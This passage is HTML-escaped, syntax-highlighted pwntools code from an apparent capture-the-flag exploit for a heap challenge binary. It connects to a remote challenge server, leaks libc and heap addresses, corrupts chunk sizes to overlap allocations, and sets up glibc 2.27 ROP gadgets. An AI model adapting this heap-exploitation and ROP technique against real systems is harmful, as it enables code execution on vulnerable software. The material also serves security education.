class=&#34;n&#34;&gt;W&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;des&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;RUN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;OP:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ID:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;  &lt;span class=&#34;s1&#34;&gt;&amp;#39;s:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;desc&amp;gt; &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;des&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;RUN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;OP:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ID:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;RUN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;OP:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;up&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;RUN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;OP:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;5&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ID:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;down&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;RUN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;OP:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;6&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ID:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;RUN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;OP:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;7&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ID:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;RUN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;OP:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;8&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ID:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./main&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;124.70.35.238&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23772&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./libc-2.27.so&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3F0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;down&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x99&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3F0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1F8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x201&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x380&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xA0&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x7F&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__malloc_hook&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x70&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x500&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;LIBC:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xA0&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;9: (10,12) &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xDA0&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1400&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x400&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HEAP:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x99&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x230&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x38&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x401&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;


&lt;span class=&#34;c1&#34;&gt;###################&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;pop_rdi_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x000000000002155f&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;pop_rdx_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0000000000001b96&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;pop_rax_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0000000000043a78&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;pop_rsi_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0000000000023e8a&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x00000000000008AA&lt;/span&gt;
